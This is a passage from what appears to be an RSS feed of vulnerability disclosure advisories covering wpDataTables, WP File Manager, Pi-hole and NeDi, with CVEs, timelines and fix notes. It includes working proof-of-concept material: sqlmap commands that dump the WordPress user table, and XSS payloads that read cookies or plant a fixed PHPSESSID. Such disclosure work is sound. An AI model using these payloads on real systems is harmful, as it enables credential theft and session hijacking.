wp-settings-time-1=1613403295draw=1&amp;amp;columns%5B0%5D%5Bdata%5D=0&amp;amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;amp;columns%5B0%5D%5Bsearchable%5D=true&amp;amp;columns%5B0%5D%5Borderable%5D=true&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B1%5D%5Bdata%5D=1&amp;amp;columns%5B1%5D%5Bname%5D=name&amp;amp;columns%5B1%5D%5Bsearchable%5D=true&amp;amp;columns%5B1%5D%5Borderable%5D=true&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B2%5D%5Bdata%5D=2&amp;amp;columns%5B2%5D%5Bname%5D=price&amp;amp;columns%5B2%5D%5Bsearchable%5D=true&amp;amp;columns%5B2%5D%5Borderable%5D=true&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;order%5B0%5D%5Bcolumn%5D=0&amp;amp;order%5B0%5D%5Bdir%5D=asc&amp;amp;start=0&amp;amp;length=10&amp;amp;search%5Bvalue%5D=&amp;amp;search%5Bregex%5D=false&amp;amp;currentUserId=1&amp;amp;currentUserLogin=admin&amp;amp;currentPostIdPlaceholder=&amp;amp;currentUserFirstName=&amp;amp;currentUserLastName=&amp;amp;currentUserEmail=test%40mail.com&amp;amp;currentDate=15%2F02%2F2021&amp;amp;currentDateTime=15%2F02%2F2021+03%3A40+PM&amp;amp;currentTime=03%3A40+PM&amp;amp;wpdbPlaceholder=wp_&amp;amp;wdtNonce=7a0d38fc5e&amp;amp;showAllRows=on&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, use the &lt;a href=&#34;http://sqlmap.org&#34;&gt;&lt;strong&gt;SQLMap&lt;/strong&gt;&lt;/a&gt; tool to exploit the vulnerability with the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Clear SQLMap local cache:rm -rf ~/.local/share/sqlmapsqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner -p length --batch&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The banner of the database is gathered as PoC of the vulnerability:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/2a2dfaf08a7be9042f4ef157424c8ada.png&#34; alt=&#34;SQLMap - Banner&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.&lt;br /&gt;To extract the &lt;strong&gt;wp_users&lt;/strong&gt; table, use the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql -p length -D wordpress -T wp_users --dump&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/5bbe2d163183e528ed12f244b5503d40.png&#34; alt=&#34;SQLMap - Database dump&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on wpDataTables version 3.4.1, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/db81e4598a66e10e267854e00bb9451a.png&#34; alt=&#34;Vulnerable version confirmation - wpDataTables 3.4.1&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.&lt;br /&gt;It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;22/02/2021&lt;/strong&gt;: First disclosure via private ticket on the Technical Support Web Page.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;23/02/2021&lt;/strong&gt;: Ticket acknowledge e-mail from Technical Support!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;05/02/2021&lt;/strong&gt;: Ticket closed, and stated that the fix will be included in the next update. (Not so) kind regards&amp;hellip;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;10/03/2021&lt;/strong&gt;: Released the version 3.4.2, which has the fix for the vulnerabilities. Check the &lt;a href=&#34;https://wpdatatables.com/help/whats-new-changelog/&#34;&gt;Changelog&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;17/03/2021&lt;/strong&gt;: Reserved CVEs by WPScan, as from 2021 it has been named a CNA for WordPress core, plugin and theme CVEs. Check &lt;a href=&#34;https://wptavern.com/wpscan-can-now-assign-cve-numbers-for-wordpress-core-plugin-and-theme-vulnerabilities&#34;&gt;here&lt;/a&gt; for further information.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;13/04/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24197&#34;&gt;CVE-2021-24197&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24198&#34;&gt;CVE-2021-24198&lt;/a&gt; as &lt;strong&gt;8.1&lt;/strong&gt; (High), &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24199&#34;&gt;CVE-2021-24199&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24200&#34;&gt;CVE-2021-24200&lt;/a&gt; as &lt;strong&gt;6.5&lt;/strong&gt; (Medium).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>WordPress Plugin WP File Manager - Reflected XSS</title>
       <link>https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/</link>
       <pubDate>Fri, 26 Feb 2021 15:00:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;I have found an authenticated Reflected XSS on WordPress Plugin WP File Manager version &amp;lt;= 7.0 on the &lt;strong&gt;User-Agent&lt;/strong&gt; HTTP parameter.&lt;/p&gt;&lt;h2 id=&#34;plugin-information&#34;&gt;Plugin Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; WP File Manager 7.0&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Web Page:&lt;/strong&gt; &lt;a href=&#34;https://wordpress.org/plugins/&#34;&gt;https://wordpress.org/plugins/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;a href=&#34;plugins@wordpress.org&#34;&gt;plugins@wordpress.org&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info or Technical Support Web Page:&lt;/strong&gt; &lt;a href=&#34;https://filemanagerpro.io/contact/&#34;&gt;https://filemanagerpro.io/contact/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin name:&lt;/strong&gt; WP File Manager&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin version:&lt;/strong&gt; &amp;lt;= 7.0&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin Web Page:&lt;/strong&gt; &lt;a href=&#34;https://wordpress.org/plugins/wp-file-manager/&#34;&gt;https://wordpress.org/plugins/wp-file-manager/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;WP File Manager is a popular WordPress plugin which makes very easy to manage files on a WordPress instance. It is currently used by 600,000+ active installations.&lt;/p&gt;&lt;p&gt;During a quick security auditing of the product, I have found that in the default configuration a Reflected XSS can occur on the endpoint /wp-admin/admin.php?page=wp_file_manager_properties when a payload is submitted on the &lt;strong&gt;User-Agent&lt;/strong&gt; parameter. The payload is then reflected back on the web application response.&lt;/p&gt;&lt;p&gt;The fix was developed with the release 7.1, two days my vulnerability disclosure, which is a very good and serious way to handle security issues.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;improper-neutralization-of-input-during-web-page-generation-reflected-cross-site-scripting-cwe-79&#34;&gt;&lt;strong&gt;Improper Neutralization of Input During Web Page Generation (Reflected Cross-Site Scripting) - CWE-79&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against the platform administrators.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; The plugin needs to be installed and activated on WordPress. No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177&#34;&gt;CVE-2021-24177&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24177&#34;&gt;&lt;strong&gt;5.4&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A malicious user can cause an administrator user to supply dangerous content to the vulnerable page, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints:&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://wordpress/wp-admin/admin.php?page=wp_file_manager_properties&#34;&gt;http://wordpress/wp-admin/admin.php?page=wp_file_manager_properties&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; User-Agent&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;While the administrator user is logged in to WordPress, visit the &lt;strong&gt;System Properties&lt;/strong&gt; page.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/17cca00d0abf4df2b0cd300214001cc0.png&#34; alt=&#34;Affected page&#34; /&gt;&lt;/p&gt;&lt;p&gt;With the HTTP Proxy like Burp Suite intercept the request.&lt;br /&gt;Then, repeat the request and append the following basic payload on &lt;code&gt;User-Agent&lt;/code&gt; header:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The payload is reflected on the response.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9bbc2a226f68d14f4cd6dd6f8db08ab8.png&#34; alt=&#34;Burp Repeater&#34; /&gt;&lt;/p&gt;&lt;p&gt;To weaponize the attack a malicious user can build a page which sends an XMLHTTPRequest on behalf of the user.&lt;br /&gt;To simulate this behavior, &lt;em&gt;right-click&lt;/em&gt; the HTTP request -&amp;gt; &lt;strong&gt;Request in browser&lt;/strong&gt; -&amp;gt; &lt;strong&gt;In original session&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Copy and paste an URL similar to the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://burpsuite/repeat/2/0jmlsl04hq2916k69iae7rtharty29hu&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/1a471ac81867d77e0432ede6180d5335.png&#34; alt=&#34;Burp - Request in original session&#34; /&gt;&lt;/p&gt;&lt;p&gt;To execute the JavaScript payload in the browser context, paste the URL in the browser:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/79e472b4cad6ab1dc9f532f250b6719e.png&#34; alt=&#34;Payload execution&#34; /&gt;&lt;/p&gt;&lt;p&gt;Please note that the &lt;strong&gt;/wp-admin/admin.php?page=wp_file_manager_properties&lt;/strong&gt; page is only available to WordPress administrators. Lower privileged users are not affected because the page is forbidden for them (error 403).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to target administrator users who are able to access the plugin configuration page within the browser with several type of direct or indirect impacts such as stealing cookies (if the HttpOnly flag is missing from the session cookies), modifying a web page, capturing clipboard contents, keylogging, port scanning, dynamic downloads and other attacks. This type of reflected XSS does require user interaction.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;16/02/2021&lt;/strong&gt;: First disclosure via private ticket on the Technical Support Web Page.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;17/02/2021&lt;/strong&gt;: Human acknowledge e-mail from Technical Support!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;18/02/2021&lt;/strong&gt;: Released the version 7.1, which has the fix for the vulnerability. Very impressive&amp;hellip;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;18/02/2021&lt;/strong&gt;: Added version on changelog: &lt;a href=&#34;https://wordpress.org/plugins/wp-file-manager/#developers&#34;&gt;https://wordpress.org/plugins/wp-file-manager/#developers&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/02/2021&lt;/strong&gt;: Update is given that the vulnerability is fixed on version 7.1.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;11/03/2021&lt;/strong&gt;: WPScan as CNA reserved the CVE on MITRE.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;09/04/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24177&#34;&gt;CVE-2021-24177&lt;/a&gt; as &lt;strong&gt;5.4&lt;/strong&gt; (Medium).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>Pi-hole - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/pi-hole-multiple-vulnerabilities-i/</link>
       <pubDate>Thu, 18 Feb 2021 11:55:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/pi-hole-multiple-vulnerabilities-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1 - Reflected Cross-site Scripting&lt;/strong&gt;: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.&lt;br /&gt;&lt;strong&gt;2 - Session Fixation&lt;/strong&gt;: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product Name:&lt;/strong&gt; Pi-hole&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerable Version:&lt;/strong&gt; 5.0, 5.1, 5.1.1&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; Pi-hole, LLC&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://pi-hole.net/&#34;&gt;https://pi-hole.net/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;a href=&#34;disclosure@pi-hole.net&#34;&gt;disclosure@pi-hole.net&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info Web Page:&lt;/strong&gt; &lt;a href=&#34;https://pi-hole.net/contact/&#34;&gt;https://pi-hole.net/contact/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.&lt;br /&gt;During a security auditing of the product, I have found two issues. The first is a Reflected XSS, the second is a Session Fixation. Those issues can be combined to steal a valid administrative session.&lt;/p&gt;&lt;p&gt;The fixes were implemented by the owners after my vulnerability notification.&lt;br /&gt;It is recommended to apply the latest update Pi-hole FTL v5.7 and Web v5.4: &lt;a href=&#34;https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/&#34;&gt;https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-reflected-cross-site-scripting-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-cwe-79&#34;&gt;&lt;strong&gt;1 - Reflected Cross-site Scripting - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - CWE-79&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35592&#34;&gt;CVE-2020-35592&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35592&#34;&gt;&lt;strong&gt;5.4&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;An attacker is able to craft an HTTP request and send it to a user, authenticated to Pi-hole, to inject arbitrary web script or HTML into the HTTP &lt;strong&gt;Origin&lt;/strong&gt; header, which reflect the user input.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/admin&#34;&gt;http://hostname/admin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; Origin header&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;Payload used to exploit the vulnerability:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;GET /admin/ HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Origin: aaa&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The user is invited to click on a malicious page that have JavaScript code to execute the following HTTP request on the browser of the victim:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/2fd0bb523d7946e780a209ca11be71bf.png&#34; alt=&#34;XSS - 1&#34; /&gt;&lt;/p&gt;&lt;p&gt;The XSS payload gets reflected to the screen.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ab243615327c43a12270942a75db8cd1.png&#34; alt=&#34;XSS - 2&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is important to note that the &lt;strong&gt;PHPSESSID&lt;/strong&gt; session cookie does not have the &lt;strong&gt;HttpOnly&lt;/strong&gt; flag, when first assigned to the user:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8f425467cc188b93240a89e81fcb0525.png&#34; alt=&#34;XSS - 3&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to target an application user with several type of direct or indirect impacts such as, credentials stealing, integrity compromising and different type of phishing attacks. This type of reflected XSS does require user interaction.&lt;/p&gt;&lt;h3 id=&#34;2-session-fixation-cwe-384&#34;&gt;&lt;strong&gt;2 - Session Fixation - CWE-384&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35591&#34;&gt;CVE-2020-35591&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35591&#34;&gt;&lt;strong&gt;5.4&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The application does not generate new session cookie after the user is logged in. A malicious user is able to create a new session cookie value and inject it to a victim. After the victim logs in, the injected cookie becomes valid, giving the attacker access to the user&amp;rsquo;s account through the active session.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/admin/index.php?login&#34;&gt;http://hostname/admin/index.php?login&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; PHPSESSID cookie&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payload used.&lt;/p&gt;&lt;p&gt;By leveraging the previously found XSS vulnerability, the malicious user can create a request to inject an arbitrary PHPSESSID value to the victim browser:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;GET /admin/ HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Origin: aaa&amp;lt;script&amp;gt;document.cookie = &amp;quot;PHPSESSID&amp;quot;+&amp;quot;=&amp;quot;+escape(&amp;quot;mosmbqsp3lh7pf1ar2djcjmk5v&amp;quot;)&amp;lt;/script&amp;gt;Cookie: PHPSESSID=mosmbqsp3lh7pf1ar2djcjmk5v&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/bcccc0b7b7861c28e3371dc3a25ff77b.png&#34; alt=&#34;Session Fixation - 1&#34; /&gt;&lt;/p&gt;&lt;p&gt;The following is the response of the payload and the new cookie added to the browser cookie storage:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/055224568ea3762d5b13c06d082a4475.png&#34; alt=&#34;Session Fixation - 2&#34; /&gt;&lt;/p&gt;&lt;p&gt;Then, when the user performs a login, the new PHPSESSID becomes valid. The attacker can add it to its browser to autenticate to the web application:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c42617cec0dd8eafd509108ec94230c9.png&#34; alt=&#34;Session Fixation - 3&#34; /&gt;&lt;/p&gt;&lt;p&gt;Indeed, after a user login, there is no a new generation of PHPSESSID:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/a94a5c151aed793c9d78fab3032fe36e.png&#34; alt=&#34;Session Fixation - 4&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue, an attacker is able to obtain a valid user session of the application. This typeof attack does require user interaction.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;15/12/2020&lt;/strong&gt;: First disclosure via e-mail to &lt;a href=&#34;disclosure@pi-hole.net&#34;&gt;disclosure@pi-hole.net&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;22/12/2020&lt;/strong&gt;: Acknowledge e-mail from the product owner!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;31/12/2020&lt;/strong&gt;: Trying to collaborate with product owner by suggesting some remediation code. I&amp;rsquo;m really glad to collaborate with them!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;16/02/2020&lt;/strong&gt;: Released the fixed versions and added a news with advisory and credits: &lt;a href=&#34;https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/&#34;&gt;https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/02/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35591&#34;&gt;CVE-2020-35591&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35592&#34;&gt;CVE-2020-35592&lt;/a&gt; as &lt;strong&gt;5.4&lt;/strong&gt; (Medium).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>NeDi 1.9C - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/</link>
       <pubDate>Wed, 10 Feb 2021 09:30:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;I have found three security issues on NeDi 1.9C:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;1 - SQL Injection&lt;/strong&gt;: An authenticated user is able to perform a SQL Injection in the Monitoring History function on the endpoint /Monitoring-History.php via the det HTTP GET parameter.&lt;br /&gt;&lt;strong&gt;2 - Code Injection&lt;/strong&gt;: An authenticated user is able to inject PHP code in the System Files function on the endpoint /System-Files.php via the txt HTTP POST parameter.&lt;br /&gt;&lt;strong&gt;3 - Command Injection&lt;/strong&gt;: An authenticated user is able to execute operating system commands in the Nodes Traffic function on the endpoint /Nodes-Traffic.php via the md or ag HTTP GET parameter.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product Name:&lt;/strong&gt; NeDi&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected Version:&lt;/strong&gt; 1.9C&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Tested platforms:&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;Manual installation with the automated NeDi install &lt;a href=&#34;https://www.nedi.ch/pub/nebuntu.sh&#34;&gt;nebuntu.sh&lt;/a&gt;&lt;/li&gt;&lt;li&gt;Debian 10 appliance for quick deployment &lt;a href=&#34;https://www.nedi.ch/pub/NeDian20.ova&#34;&gt;NeDian20 OVA&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; NeDi Consulting&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.nedi.ch&#34;&gt;https://www.nedi.ch&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;a href=&#34;info@nedi.ch&#34;&gt;info@nedi.ch&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.nedi.ch/impressum&#34;&gt;https://www.nedi.ch/impressum&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;NeDi is an open source software tool which discovers, maps and inventories network devices and tracks connected end-nodes.&lt;br /&gt;During a security auditing of the product, I have found three issues.&lt;br /&gt;The first is a SQL Injection, the second is a Code Injection, and the third is a Command Injection.&lt;/p&gt;&lt;p&gt;The fixes were developed by the owner three day after my vulnerability notification. That&amp;rsquo;s a very professional way to handle high impact security vulnerabilities!&lt;/p&gt;&lt;p&gt;It is recommended to apply the latest patch 1.9Cp1: &lt;a href=&#34;https://www.nedi.ch/pub/nedi-1.9C1.ptc&#34;&gt;https://www.nedi.ch/pub/nedi-1.9C1.ptc&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89&#34;&gt;&lt;strong&gt;1 - Improper Neutralization of Special Elements used in an SQL Command (&amp;lsquo;SQL 